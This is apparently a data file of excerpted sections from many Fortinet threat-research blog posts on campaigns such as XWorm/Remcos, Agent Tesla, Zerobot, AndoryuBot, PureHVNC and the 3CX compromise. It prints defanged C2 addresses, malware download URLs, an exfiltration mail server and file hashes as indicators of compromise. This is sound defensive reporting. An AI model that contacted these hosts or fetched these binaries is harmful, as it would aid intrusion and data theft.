TTPs (Tactics, Techniques, and Procedures)-and in some cases, utilizes the same infrastructures-as another Pakistan-based threat actor group known as \"Transparent Tribe.\" Some reports even claim that SideCopy is a subsidiary of Transparent Tribe. The group was allegedly named \"SideCopy\" because an infection chain they employed was copied from the long-time Indian threat actor group SideWinder in a likely attempt to make attribution more difficult. Although SideCopy primarily targets Windows platforms, some reports indicate they have deployed malware to compromised Mac and Linux machines.", "source": "Fortinet"}, {"title": "Conclusion", "content": "A targeted campaign, where the attacker takes the time to create a lure relevant enough for a target to pursue, will always open more doors for an attacker. In this case, we saw SideCopy deliver one that would be of interest only to a small group of people in the Indian defense industry.\nTargets in this position would be of definite interest to the Government of Pakistan and any threat actors that align with its aims.", "source": "Fortinet"}, {"title": "Introduction", "content": "In 1923, the Soviet Union created the Nagorno-Karabakh Autonomous Oblast (an oblast is an administrative region or province) within the Azerbaijan Soviet Socialist Republic. This oblast has a 95% ethnically Armenian population. In 1988, Nagorno-Karabakh declared its intention to leave Azerbaijan and join the neighboring Republic of Armenia. While the Soviet Union was able to keep the resulting tension under control, once the USSR began to collapse, armed conflict between Azerbaijan and Armenia began for control of the Nagorno-Karabakh region. While a ceasefire was tentatively reached in 1994 and again in 2020,tensions remain highbetween the two countries.\nAffected platforms:Microsoft WindowsImpacted parties:Targeted management associated with an Azerbaijanian companyImpact:Reconnaissance of basic computer info of targeted usersSeverity level:Low", "source": "Fortinet"}, {"title": "Conclusion", "content": "The threat actor in this campaign uses a few advanced techniques, including RUST and after-hours execution, to help it stay under the radar and make analysis more difficult. The size of the network infrastructure also suggests this threat actor is not a run-of-the-mill malware developer but someone with access to resources. And the use of a geopolitical rule indicates that this threat actor is plugged in and knows how to target specific users.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:WindowsImpacted parties:Any organizationImpact:Controls victim's device and collects sensitive informationSeverity level:Critical\nFortiGuard Labs recently detected a new injector written in Rust-one of the fastest-growing programming languages-to inject shellcode and introduce XWorm into a victim's environment. While Rust is relatively uncommon in malware development, several campaigns have adopted this language since 2019, includingBuer loader,Hive, and RansomExx. FortiGuard Labs analysis also revealed a significant increase in injector activity during May 2023, where the shellcode can be encoded with Base64 and can choose from encryption algorithms such as AES, RC4, or LZMA to evade antivirus detection.\nBy examining the encoded algorithms and API names, we identified the origin of this new injector in the Red Team tool \"Freeze.rs,\" designed to create payloads able to bypass EDR security controls. Additionally, during our analysis of the attack, we discovered that SYK Crypter-a tool commonly used to deliver malware families via the community chat Discord-was involved in loading Remcos, a sophisticated remote access Trojan (RAT) that can be used to control and monitor devices running Windows. SYK Crypter emerged in 2022 and has been used by various malware families, including AsyncRAT, njRAT, QuasarRAT, WarzoneRAT, and NanoCore RAT.\nFortiGuard Labs observed phishing email activity on July 13 that initiated an attack chain using a malicious PDF file. This file redirects to an HTML file and utilizes the \"search-ms\" protocol to access an LNK file on a remote server. Upon clicking the LNK file, a PowerShell script executes Freeze.rs and SYK Crypter for further offensive actions. Eventually, XWorm and Remcos are loaded, and communication with the C2 server is established.\nIn this article, we will delve into the initial attack method employed to deliver the Rust-lang injector, SYK Crypter, and further explore the subsequent stages of the attack.", "source": "Fortinet"}, {"title": "Conclusion", "content": "The combination of XWorm and Remcos creates a formidable trojan with an array of malicious functionalities. The C2 server's traffic report, as shown in Figure 25, reveals Europe and North America as the primary targets of this malicious campaign. As part of their strategy, the phishing campaign utilizes a PDF stream object and leverages the \"search-ms\" feature to entice unsuspecting victims. To further evade detection, threat actors adeptly use the Rust injector \"Freeze.rs\" and the MSIL file \"SYK Crypter.\" In this blog, we delved into the attack methodology employed through phishing emails and examined the various files involved in deceiving victims. Moreover, we provide a comprehensive overview of the functionalities within Freeze.rs and detail the workings of SYK Crypter. Given these developments, users should continue to exercise vigilance in handling suspicious mail and remain alert to potential threats.", "source": "Fortinet"}, {"title": "ioc", "content": "Hostname:\nfreshinxworm[.]ddns[.]netchurchxx[.]ddns[.]netplunder[.]ddnsguru[.]complunder[.]dedyn[.]ioplunder[.]jumpingcrab[.]complunder[.]dynnamn[.]ru\nIP Address:\n95[.]214[.]27[.]17\nFiles:\n40c9d3dec84aa057c167005f860749a2cfa55faa0cddd2fe39aaf3906819203c5a47b18066d8dcd0fbc524f529002cf0a270d8394de928e8426fa06959a8270440041c3240eaa39da781a68f6a60f93577f1b0bbdaee5a0297d7fe329c073baa908656aecc2ae845249acb392fbaa5ba3f8d26b05f4d762afb85b622f7eadcf0ca0efb6da9edbe627ab206a7f494adb42f8483da1d574ddb8f723c1ddfeaecc409505b5cf1541b783f14b1bf1403b918fae70f049d72f47439bd068a43ed8e0a88aeb09dcc59858c9969b7ae1e0e2b58f0aa90b2d27a5edfe9cd82e602ed5952f44e495e1301866188a62916859075ed73d13193823c69884312f04785707279d7e684fe7f3729edd70e2855528af3e634789155d687ed98911d1d2f0200d2a66c6da5a649f9165834c24ac8f7e2332a5612eda54312dcc9f107ab29182e58c9b499cdefac0faa328775ebb6e64b351ee43498532f987743a5a6dcfd5266f20f58235e47d5f5b8218da1d5e9dd3449c4f8969f038bba018521f9884fa1cdf693dd806527cd56244208ee530ee26c90004eb7af343ffdb618c031f63cb1d0e2409ce4e79962ec3e5a307282afcb72b4da39c4a2aace29f3f85c060d8c07cf390547e238a43f9cc38f2d4e449c7d8a557b990e60773ad02820717a634c22b609bec4e613ee1365d8561be02525896c095c8a3fda3199f2f615ab32a644f3d90451b54a4f92b1081f0c10a41c2404d51ed340181c485751efb974113a5cf401ad9cb26144c6e42601f1f1be09ece7c7fcb127637db3b953065648d1b1f371da7e8a904343ba2502d390b36403181e77192a62f31e98c87eb91906fbae27019b4c0d98ab2fc44063d4e00f221e502419d9cca598fafb9e1e00352149327267604bc1\nLearn more about Fortinet'sFortiGuard Labsthreat research and global intelligence organization and Fortinet's FortiGuard AI-powered Security Servicesportfolio.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of vulnerable systemsSeverity level:Critical\nIn April, FortiGuard Labs observed a unique botnet based on the SOCKS protocol distributed through the Ruckus vulnerability (CVE-2023-25717). This botnet, known as AndoryuBot, first appeared in February 2023. It contains DDoS attack modules for different protocols and communicates with its command-and-control server using SOCKS5 proxies. Based on our IPS signatures trigger count (Figure 1), this campaign started distributing the current version sometime after mid-April.\nThis article details how this malware leverages the Ruckus vulnerability and examines its behavior once inside an infected device.", "source": "Fortinet"}, {"title": "Conclusion", "content": "CVE-2023-25717 is a remote code execution vulnerability affecting multiple Ruckus wireless Access Point (AP) devices (FortiGuard Labs released athreat signal reportabout CVE-2023-25717 on April 28). Once a target device is compromised, AndoryuBot quickly spreads and begins communicating with its C2 server via the SOCKS protocol. In a very short time, it is updated with additional DDoS methods and awaits attack commands. Users should be aware of this new threat and actively apply patches on affected devices as soon as they become available.", "source": "Fortinet"}, {"title": "ioc", "content": "C2:\n163[.]123[.]142[.]146\n45[.]153[.]243[.]39\nFiles:\nea064dd91d8d9e6036e99f5348e078c43f99fdf98500614bffb736c4b0fff408\nf42c6cea4c47bf0cbef666a8052633ab85ab6ac5b99b7e31faa1e198c4dd1ee1\n3441e88c80e82b933bb09e660d229d74f7b753a188700fe018e74c2db7b2aaa0\n3c9998b8451022beee346f1afe18cab84e867b43c14ba9c7f04e5c559bfc4c3a\nb71b4f478479505f1bfb43663b4a4666ec98cd324acb16892ecb876ade5ca6f9\ne740a0d2e42c09e912c43ecdc4dcbd8e92896ac3f725830d16aaa3eddf07fd5c\n4fe4cff875ef7f8c29c95efe71b92ed31ed9f61eb8dfad448259295bd1080aca\n2e7136f760f04b1ed7033251a14fef1be1e82ddcbff44dae30db12fe52e0a78a\n1298da097b1c5bdce63f580e14e2c1b372c409476747356a8e9cfaf62b94513d\n55e921a196c92c659305aa9de3edf6297803b60012f83967562a57547875fec1", "source": "Fortinet"}, {"title": "Introduction", "content": "MITRE Engenuity's Center for Threat-Informed Defense (CTID) recentlyreleased its latest versionof theAttack Flow project. This is the third project FortiGuard Labs has worked on in partnership with CTID, and we're particularly excited about the promise this effort holds to advance the entire cybersecurity industry. CTID and Fortinet\u00ad-in collaboration with additional research partners-introduced Attack Flow earlier this year with the goal of developing \"a common data format for describing sequences of adversary behavior in order to improve defensive capability.\"\nOne of the most powerful things you can do when fighting cybercrime is shifting the economics of an attack, and this new standard focused on adversary behavior does just that. It allows for a deeper understanding of the unfolding details around an attack. By adding another dimension to cyber intrusion data, cyber defenders can narrow in even more on the paths an attacker is most likely to take and then put the proper roadblocks in place to stop them.\nMITREAttack Flow is invaluable for security leaders and their teams. Understanding and visually communicating the flow of an attack-as well as its potential outcomes and affected assets-can make us all more effective defenders.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:WindowsImpacted Users:Windows usersImpact:Potential to deploy additional malware for additional purposesSeverity Level:Medium\nOne of the most exciting aspects of malware analysis is coming across a family that is new or rare to the reversing community. Determining the function of the malware, who created it, and the reasons behind it become a mystery to solve. The previously unseen dropper variant we recently found, named MidgeDropper, has a complex infection chain that includes code obfuscation and sideloading, making it an interesting use case. Although we couldn't obtain the final payload, this blog will still explore what makes this dropper tick.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:Microsoft WindowsImpacted parties:Windows UsersImpact:Collects sensitive information from a victim's computerSeverity level:Critical\nOur FortiGuard Labs captured a phishing campaign that spreads a new Agent Tesla variant. This well-known malware family uses a .Net-based Remote Access Trojan (RAT) and data stealer to gain initial access. It is often used for Malware-as-a-Service (MaaS).\nI performed an in-depth analysis of this campaign, from the initial phishing email to the actions of Agent Tesla installed on the victim's machine to the collecting of sensitive information from the affected device. In this analysis, you will learn about the contents of this attack, such as how the phishing email starts the campaign, how the CVE-2017-11882/CVE-2018-0802 vulnerability (and not the VBS macro) is exploited to download and execute the Agent Tesla file on the victim's device, as well as how Agent Tesla collects the sensitive data from the victim's device, such as the credentials, key loggings, and screenshots of the victim's screen.\nDespite fixes forCVE-2017-11882/CVE-2018-0802being released by Microsoft in November, 2017 and January, 2018, this vulnerability remains popular amongst threat actors, suggesting there are still unpatched devices in the wild, even after over five years. We are observing and mitigating3000 attacks per day, at the IPS level. The number of observed vulnerable devices isaround 1300per day.", "source": "Fortinet"}, {"title": "Summary", "content": "The following flowchart roughly describes the outline of the malicious campaign.\nThis analysis shows that a malicious Excel document attached to a phishing email exploits an aging security vulnerability to execute a shellcode that downloads Agent Tesla. It keeps relevant modules encrypted and encoded in the Resource section to protect its core module from being analyzed.\nI then explained how this variant establishes persistence on the victim's device. I also showed the kind of software and data Agent Tesla is able to steal from the infected device, including credentials, keylogging data, and active screenshots.\nLastly, I provided several examples of the kind of sensitive data this variant of Agent Tesla obtained from my analysis environment and how this stolen sensitive data is submitted to the attacker via emails over SMTP protocol.", "source": "Fortinet"}, {"title": "ioc", "content": "URLs:\nHxxp[:]//23[.]95.128.195/3355/chromium.exe\nC2 Server List:\nSMTP server @ mail.daymon.cc:587\nRelevant Sample SHA-256:\n[Order 45232429.xls]FDC04DC72884F54A4E553B662F1F186697DAF14EF8A2DC367BC584D904C22638\n[chromium.exe / dasHost.exe / downloaded file]36B17C4534E34B6B22728DB194292B504CF492EF8AE91F9DDA7702820EFCFC3A", "source": "Fortinet"}, {"title": "Introduction", "content": "FortiGuard Labs gathers data on ransomware variants of interest that have been gaining traction within our datasets and the OSINT community. The Ransomware Roundup report aims to provide readers with brief insights into the evolving ransomware landscape and the Fortinet solutions that protect against those variants.\nThis edition of the Ransomware Roundup covers the Shinra and Limpopo ransomware.\nAffected platforms:Microsoft Windows, VMWare ESXiImpacted parties:Microsoft Windows and VMWare ESXi UsersImpact:Encrypts victims' files and demands ransom for file decryptionSeverity level:High", "source": "Fortinet"}, {"title": "Victimology", "content": "Based on the locations from which ransom notes likely used by the Limpopo ransomware family were submitted to the publicly available scanning service, the countries of Chile, Guatemala, Honduras, India, Italy, Mexico, Peru, Spain, Thailand, the United States, and Vietnam were potentially affected.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:WindowsImpacted parties:Any organizationImpact:Remote attackers steal credentials, sensitive information, and cryptocurrencySeverity level:Critical\nIn August, FortiGuard Labs obtained a Word document containing a malicious URL designed to entice victims to download a malware loader. This loader employs a binary padding evasion strategy that adds null bytes to increase the file's size to 400 MB. The payloads of this loader include OriginBotnet for keylogging and password recovery, RedLine Clipper for cryptocurrency theft, and AgentTesla for harvesting sensitive information. Figure 1 illustrates the comprehensive attack flow.\nIn this blog, we examine the various stages of how the file is deployed and delve into the specifics of the malware it delivers.", "source": "Fortinet"}, {"title": "Conclusion", "content": "This cyberattack campaign uncovered by FortiGuard Labs involved a complex chain of events. It began with a malicious Word document distributed via phishing emails, leading victims to download a loader that executed a series of malware payloads. These payloads included RedLine Clipper, Agent Tesla, and OriginBotnet. The attack demonstrated sophisticated techniques to evade detection and maintain persistence on compromised systems. We also provided a comprehensive breakdown of each attack stage, shedding light on the intricacies of the deployed malware and the tactics employed.", "source": "Fortinet"}, {"title": "ioc", "content": "URLs:\nbankslip[.]infosoftwarez[.]onlinenitrosoftwares[.]shop\nFiles:\nc9e72e2865517e8838dbad0ce41561b2bd75c399b7599c1711350f9408189b9b56ced4e1abca685a871b77fab998766cbddfb3edf719311316082b6e05986d67c204f07873fafdfd48f37e7e659e3be1e4202c8f62db8c00866c8af40a9a82c521ad235118c371e2850c539040b6dcdd88196c021245440155fe80aacf6ccc7e4617631b4497eddcbd97538f6712e06fabdb53af3181d6c1801247338bffaad3be915d601276635bf4e77ce6b84feeec254a900c0d0c229b0d00f2c0bca1bec7c241e3b5d389b227484a8baec303e6c3e262d7f7bf7909e36e312dea9fb82798dfd2b218387910b4aab6e5ee431acab864b255832eddd0fc7780db9d5844520af36464557efef14b7ee4cebadcc0e45af46f5c06b67c5351da15391b03a19c4cb15055e75ae0eeb4585f9323ef041fa25ed9b6bf2896b6ea45d871d49a1c72b849c969a5461b2919fd9a7dc7f76dd84101b2acc429b341f8eeee248998e9da3265e47578274d16be1be0f50767bad0af16930df43556dd23d7ad5e4adc2bcbe3", "source": "Fortinet"}, {"title": "Introduction", "content": "NOTE: The term \"Zerobot\" in this article refers to a specific malware variant. It is not in any way associated with zerobot.ai, an organization that offers a verbal chatbot service.\nIn November,FortiGuard Labsobserved a unique botnet written in the Go language being distributed throughIoT vulnerabilities. Thisbotnet, known as Zerobot, contains several modules, including self-replication, attacks for different protocols, and self-propagation. It also communicates with its command-and-control server using the WebSocket protocol. Based on some IPS signatures trigger count (shown in Figure 1), this campaign started its distribution of the current version sometime after mid-November.\nAffected platforms:LinuxImpacted parties:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity level:Critical\nThis article details how this malware leverages vulnerabilities and examines its behavior once inside an infected device.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Zerobot is a new botnet written in the Go programming language. It communicates via the WebSocket protocol. It first appeared on November 18 and is designed to target a variety of vulnerabilities. Within a very short time, it was updated with string obfuscation, a copy file module, and a propagation exploit module that make it harder to detect and gives it a higher capability to infect more devices. Users should be aware of this new threat, patch any affected systems listed in Figure 13 running on their network, and actively apply patches as they become available.", "source": "Fortinet"}, {"title": "ioc", "content": "C2:\n176[.]65[.]137[.]5\nFiles:\n7ae80111746efa1444c6e687ea5608f33ea0e95d75b3c5071e358c4cccc9a6fc\ndf76ab8411ccca9f44d91301dc2f364217e4a5e4004597a261cf964a0cd09722\ncd9bd2a6b3678b61f10bb6415fb37ea6b9934b9ec8bb15c39c543fd32e9be7bb\n50d6c5351c6476ea53e3c0d850de47059db3827b9c4a6ab4d083dfffcbde3579\n7722abfb3c8d498eb473188c43db8abb812a3b87d786c9e8099774a320eaed39\n2955dc2aec431e5db18ce8e20f2de565c6c1fb4779e73d38224437ac6a48a564\n191ce97483781a2ea6325f5ffe092a0e975d612b4e1394ead683577f7857592f\n447f9ed6698f46d55d4671a30cf42303e0bd63fe8d09d14c730c5627f173174d\ne0766dcad977a0d8d0e6f3f58254b98098d6a97766ddac30b97d11c1c341f005\n6c284131a2f94659b254ac646050bc9a8104a15c8d5482877d615d874279b822\n5af002f187ec661f5d274149975ddc43c9f20edd6af8e42b6626636549d2b203\n74f8a26eb324e65d1b71df9d0ed7b7587e99d85713c9d17c74318966f0bead0a\n9c16171d65935817afd6ba7ec85cd0931b4a1c3bafb2d96a897735ab8e80fd45\nb1d67f1cff723eda506a0a52102b261769da4eaf0551b10926c7c79a658061fd\nf0bb312eacde86d533c922b87e47b8536e819d7569baaec82b9a407c68084280\n2460434dabafe5a5dde0cce26b67f0230dbcd0d0ab5fabad1a1dbc289dc6432f\n2af33e1ff76a30eb83de18758380f113658d298690a436d817bd7e20df52df91\n4483c4f07e651ce8218216dd5c655622ff323bf3cdfe405ffeb69eafa75efad5\n7c085185f6754aef7824c201d8443300ff2b104521d82f9a8b8feb5d4c8d3191\n6ac49092ee1bdd55ddbf57df829f20aac750597d85b5904bb7bafa5b51fbb44d\nf9fc370955490bdf38fc63ca0540ce1ea6f7eca5123aa4eef730cb618da8551f\n6dd71163b6ab81a35ce373875a688ad9b31e0d1c292f02e8b2bafa7b3d1e3731\nd88e9248ff4c983aa9ae2e77cf79cb4efc833c947ec2d274983e45c41bbe47e1\n96bbb269fd080fedd01679ea82156005a16724b3cde1eb650a804fa31f18524e\n439b2e500e82c96d30e1ef8a7918e1f864e6d706d944aeddffe61b8bf81ef6d3\naf48b072d0070fa09bca0868848b62df5228c34ef24d233d8eb75a1fde8ac23f\n5824fc51fcfba1a6315fd21422559d63c56f0e2192937085d65f9a0ac770eb3a\nc9ea4cda12c14c895e23988229831b8f04ccab315c1cbc76a9efae888be55a3b\ne2c2a0cccefc4314c110f3c0b887e5008073e607c61e1adde5000efb8e630d50", "source": "Fortinet"}, {"title": "Introduction", "content": "FortiGuard Labsmonitors the IoT botnet threat landscape for new and emerging campaigns. We do this with the assistance of our honeypots we have deployed to capture active attacks in the wild. This article provides insights into the data collected from our monitoring system over the past year.\nAffected Platforms:Linux\nImpacted Users:Any organization\nImpact:Remote attackers gain control of the vulnerable systems\nSeverity Level:Critical", "source": "Fortinet"}, {"title": "Conclusion", "content": "IoT malware is very much alive and continues to exploit both old and new vulnerabilities to infect devices and propagate themselves. While most of them target router vulnerabilities, there are notable exceptions, like the popular F5 BIG-IP iControl CVE-2022-1388 and VMware Workspace ONE Access CVE-2022-22954 vulnerabilities. Data from our telemetry also verifies that even old vulnerabilities from 2014 are still being actively exploited.\nMirai and Gafgyt-based malware still dominate the IoT threat landscape in terms of the sheer volume of samples. There is also a growing variety of malware written in the Go programming language, possibly fueled by the increasing availability of malware source code in public repositories like GitHub, which makes it easy for unsophisticated threat actors to build and operate their own botnets.\nWith this increased interest in using Golang for malware development, we expect to see even more Golang IoT botnets this year.\nFortiGuard Labs will continue to track and report on emerging threats and trends in the IoT threat landscape.", "source": "Fortinet"}, {"title": "ioc", "content": "Files\n8332871673d8e9d90c95a463e1bdc73b1fae1a59b46767cab1c0c9257de4e7f5\nebe891df3802d21c34d1821c5c772d77de4c6e71eb84690ec19aecb923a95aca\nfd47e446e72d7eb6e75f4990c192559c349b92f60fa6f57508fde646cf8317aa\n51f45d81f00e65a29b02231e5eba7ac850094fa00172668daf439d28d544717e\n038271675df68c56ce147852093fcb795cbde55198d33f4be52d6d102689764d\n56ab2c3f334f73b986c64180d5c82d4050a583ff06da0873ff4750be4a02bbaf\n8dceacda8288e61769a9ccf6900dff45d500679440b006138d4746ebf15cc664\ne2c2a0cccefc4314c110f3c0b887e5008073e607c61e1adde5000efb8e630d50\n1c1817e9c32dcf70871505a39d235d0f424f985d13998706ed0ed6aaffc20da6\nb4cd314c832f046143d200285dd1fb96f1f7443bc0e3d321614225bf77783160\n5f73c66e72118cb2d18ff839e9f94d1d0e1da44a5c76a0972c537652eacf708b\nDownload URLs\nhxxp://176[.]65[.]137[.]5/bins/zero[.]x86\nC2\n176[.]65[.]137[.]5\n194[.]87[.]84[.]154", "source": "Fortinet"}, {"title": "Introduction", "content": "In April, VMware patched a vulnerabilityCVE-2022-22954. It causes server-side template injection because of the lack of sanitization on parameters \"deviceUdid\" and \"devicetype\". It allows attackers to inject a payload and achieve remote code execution on VMware Workspace ONE Access and Identity Manager. FortiGuard Labs publishedThreat Signal Reportabout it and also developed IPS signature in April.\nWe observed attacks in the wild since then. Most of the payloads focus on probing a victim's sensitive data, for example, passwords, hosts file, etc. But in August, there were a few particular payloads, which got our interest. They had the intention of deploying Mirai targeting exposed networking devices running Linux, RAR1ransom that leverages legitimate WinRaR to deploy encryption, and GuardMiner that is a variant of xmrig used to \"mine\" Monero.\nIn this blog, we will elaborate on how these malware leveraged the VMware vulnerability and the behavior after exploitation in more detail.\nAffected platforms:VMware Workspace ONE Access and Identity ManagerImpacted parties:VMware usersImpact:Attacker can exploit the vulnerability to launch a command injection attack by sending some messages with malicious commandsSeverity level:Critical", "source": "Fortinet"}, {"title": "Conclusion", "content": "Although the critical vulnerability CVE-2022-22954 is already patched in April, there are still multiple malware campaigns trying to exploit it. Users should always keep systems updated and patched and be aware of any suspicious process in environment. These Mirai variants, RAR1Ransom, and GuardMiner are not extremely complicated samples, but their methods are always changing and evolving. FortiGuard Labs will continue to monitor and provide the latest updates.", "source": "Fortinet"}, {"title": "ioc", "content": "SHA256:\n66db83136c463441ea56fb1b5901c505bcd1ed52a73e23d7298f7055db2108d14761e5d9bd3ebe647fbd7840b7d2d9c1334bde63d5f6b05a4ed89af7aa3a6eab9c00823295f393358762542418bb767b44cfe285c4ab33e7e57902c6e1c2dacb23270d23f8485e3060f6ea8c9879177781098b1ed1b5117579d2f4d309aeffd24b3578ee9e81f356a89ff2e1aff6bbee8441472869b0c6c4792fc9fd486a0df50212b447c25e9db55f7270e1e2a45846e2261445474845997a314cb1ddeea4f7a372e07a691f8759e482615fd7624bfca2a2bc2cd8652a47ff9951ff035759a5f2a6827ea5f60cefc2f6528269b2d1557a7cc1e68f84edca4029e819dd0509cb4b4c0d3cb708612b1fdb0394e029e507e4c0f6136fc44e415200694624ed5b687fc7c242ad1fa439e515725561a9e304b3d94e40ba91f61df77471a4c2ff2b39\nLearn more about Fortinet'sFortiGuard Labsthreat research and global intelligence organization and Fortinet's FortiGuard AI-powered Security Servicesportfolio.Sign upto receive our threat research blogs.", "source": "Fortinet"}, {"title": "Introduction", "content": "This is a developing story. Please check back for the latest updates from FortiGuard Labs. For a report of this event, please visit ourThreat Signal Reportspage.\nOnMarch 29, a number of reports surfaced thata legitimate signed file from VoIP/IP PBX solutions provider 3CX (3CXDesktop App) had been trojanized due to a code-level compromise. This is the latest high-profilesupply chain attack, beginning with SolarWinds and Kaseya a few years ago. This issue has been assignedCVE-2023-29059.\n3CXDesktop App is a multi-platform softphone application for desktops (Linux, MacOS, and Windows). The 3CXDesktop App allows users to interact via chat, messaging, video, and voice. Initial reports suggested that all platforms of the 3CXDesktop App were compromised. But at the time of writing, it appears that only the Electron framework versions of MacOS (versions 18.11.1213, 18.12.402, 18.12.407, and 18.12.416) and Windows (versions 18.12.407 and 18.12.416) of the 3CX Desktop App areaffected.  3CX has stated that they are working on a new version of the Windows app and have revoked the certificate for the previous version. Initially, there was some confusion about whether the MacOS version was affected, as the CEO of 3CX issued a statement that only the Windows version of the app was affected. However, this statement was laterretracted. Currently, no status on the availability of the MacOS version has been provided at the time of writing.\nThe company's website boasts that 3CX is available in over 190 countries worldwide, with over 12 million daily users and a 600,000-plus customer base. Companies listed on its website include high-profile organizations in the automobile, aerospace, finance, food and beverage, government, hospitality, and manufacturing sectors, to name a few.\nThe trojanized 3CX Desktop App is part of a multi-stage attack that utilizes a malicious sideloaded DLL (ffmpeg.dll - SHA256: 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896) that contains instructions and a payload within another DLL via an encrypted blob (d3dcompiler_47.dll \u2013 SHA256: 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03). This blob also contains the shellcode, which tries to pull ICO files from GitHub (currently down) that contain various URIs for download, where the payload is ultimately loaded and installed to the target environment. However, we could not confirm further details as the repository is currently down.", "source": "Fortinet"}, {"title": "ioc", "content": "akamaicontainer[.]com\nakamaitechcloudservices[.]com\nazuredeploystore[.]com\nazureonlinecloud[.]com\nazureonlinestorage[.]com\ndunamistrd[.]com\nglcloudservice[.]com\njournalide[.]org\nmsedgepackageinfo[.]com\nmsstorageazure[.]com\nmsstorageboxes[.]com\nofficeaddons[.]com\nofficestoragebox[.]com\npbxcloudeservices[.]com\npbxphonenetwork[.]com\npbxsources[.]com\nqwepoi123098[.]com\nsbmsa[.]wikisourceslabs[.]com\nvisualstudiofactory[.]com\nzacharryblogs[.]com\nazureonlinestorage.com\nconvieneonline[.]com\nSoyoungjun[.]com", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected Platforms:TP-Link Archer AX21 (AX1800) Version 1.1.4 Build 20230219 or priorImpacted Users:Any organizationImpact:Remote attackers gain control of the vulnerable systemsSeverity Level:High\nLast year, a command injection vulnerability,CVE-2023-1389, was disclosed and a fix developed for the web management interface of the TP-Link Archer AX21 (AX1800). FortiGuard Labs has developed an IPS signature to tackle this issue. Recently, we observed multiple attacks focusing on this year-old vulnerability, spotlighting botnets like Moobot, Miori, the Golang-based agent \"AGoent,\" and the Gafgyt Variant. Peaks caused by these threats are evident in the following figure. This article will explore their infection traffic patterns and offer insights into these botnets.", "source": "Fortinet"}, {"title": "Conclusion", "content": "As usual, botnets relentlessly target IoT vulnerabilities, continuously attempting to exploit them. Despite the discovery and provided remediation for the vulnerability CVE-2023-1389 last year, numerous campaigns still exploit it, resulting in significant peaks in our IPS telemetry. Users should be vigilant against DDoS botnets and promptly apply patches to safeguard their network environments from infection, preventing them from becoming bots for malicious threat actors.", "source": "Fortinet"}, {"title": "Introduction", "content": "Affected platforms:Microsoft WindowsImpacted parties:Any organizationImpact:Attackers gain control of the infected systemsSeverity level:High\nThis past April, FortiGuard Labs uncovered a sophisticated attack that leveraged multiple layers of obfuscation and evasion techniques to distribute and execute VenomRAT via ScrubCrypt. However, this attack campaign didn't end with VenomRAT, as the subsequently loaded plugin continued to deploy various types of malware into the victim's environment.\nWe recently identified a phishing campaign that also employs multiple layers of evasion techniques to deploy various malware into an infected environment. This campaign was aimed at employees and posed as a customer requesting a service. The email uses urgent language to deceive a victim into clicking a malicious attachment, initiating a series of harmful activities and deploying several types of malware. All the malware in this attack uses the same packing and obfuscation techniques, including a Python obfuscator, 'Kramer,' a shellcode generator, 'donut,' and a shellcode loader, 'laZzzy,' to conceal itself from detection. The deployed malware includes XWorm, Venom RAT, AsyncRAT, and PureHVNC. Figure 1 shows the attack chain.\nThis threat report describes how this attack is delivered and analyzes the PureHVNC malware used in this campaign.", "source": "Fortinet"}, {"title": "Conclusion", "content": "Deploying multiple types of malware in an attack campaign is not unusual. In this case, the threat actor also uses complex, multilayer encryption to avoid detection across all the malware used in this campaign.\nIn this article, we uncovered a phishing campaign targeting employees that employs a multi-stage execution flow and utilizes public hacking tools to evade detection. We also focused on one obfuscated payload, \"PureHVNC,\" detailing its functions and the additional plugins collected. Our observations indicate that it targets crypto wallets, password managers, and 2FA authenticators. Finally, it can carry out further attacks using its RemoteDesktop and Executing plugins.", "source": "Fortinet"}, {"title": "ioc", "content": "C2\ndrvenomjh[.]duckdns[.]org\nvxsrwrm[.]duckdns[.]org\nncmomenthv[.]duckdns[.]org\nghdsasync[.]duckdns[.]org\nanachyyyyy[.]duckdns[.]org\nxoowill56[.]duckdns[.]org\nURLs\nhxxps://float-suppose-msg-pulling[.]trycloudflare[.]com/\nFiles\n16a4de0540181bab7c5d25fcdf90838a28f2dff4ed9e0e37de3f5f1ab20afe0a\n062c5f5e9cdfd731912b262297e963b6d5e1b1d114184728065522f46a5eef2f\n2b7ee0ccfa45d2f53098cd8aa4ce73cb00ace462d8490e6843bf05cd07854553\n430300b8c527259805d29ab3fd150d9d297004ff77346cc07753290d84e77e95\n503ce7bcefdffb96b5de78254f947598a410b86d3aaf597c7334e248c46dae5b\n55134d705ccf881d011af949ad2fc0aa80dc7af50fa4a9db29b665647b869aec\n561f4b4e2c16f21b0db015819340fc59484e4994022c4cca46cf778006d5d441\n6b4f058ba41e829ff993e61b288e55552af3d98f9cd62483eeff088b26f6ab9b\n71b797032458aab9b4a1a203e7ca413f009af1961cffb98590e34f672574599a\n7292316900a0971aec0a302bc3c6632902d820804ce3b2375a9953744cab1bd9\n72ce64d50f9aa15b21631307d2143f426364634a7a2ee4b401ef76bd88c4ff3b\n8bbdd3b41a03b86f246564a23e9acd48f74428f372c4bfb0a9a3af42511661c7\n8d28191f647572d5e159f35ae55120ddf56209a18f2ca95a28d3ca9408b90d68\n90995c621718ae65ca0af4deb10a9cb895bd494df40a7b34031b17efcc63114a\nb393323b9834656a2999198d4f02c1a159c6034d3c20c483d22a30aab3810c0c\nb3bb7064af80abef417e6e7775a7e14b0bd27233fd66c2252e714a4dd2ee9c21\nd4e8bf427c196d1d5ffca52a5af7162cc5cf4df730ee3fe65b4381ac79662a15\ne5f7efb35b7316c7ace1c322559fa9a8680ddb1ac15bef7d17e5b84c767f5b75\n95a33ba5550747baf72e39b020e6215b6047983eda17250408cd6f4c16a93089\n1967661f7c32607f7cfcb9053aeb8dea0a9d8f49979e729be77a43628c91469f\n7c4e613cf4db19f54030097687227809f965a951a26a44a882692ece6e642e3c\n441c4502584240624f4af6d67eded476c781ff0b72afe95ea236cc87a50e5650", "source": "Fortinet"}, {"title": "Introduction", "content": "The Phobos ransomware family is a notorious group of malicious software designed to encrypt files on a victim's computer. It emerged in 2019 and has since been involved in numerous cyber attacks. This ransomware typically appends encrypted files with a unique extension and demands a ransom 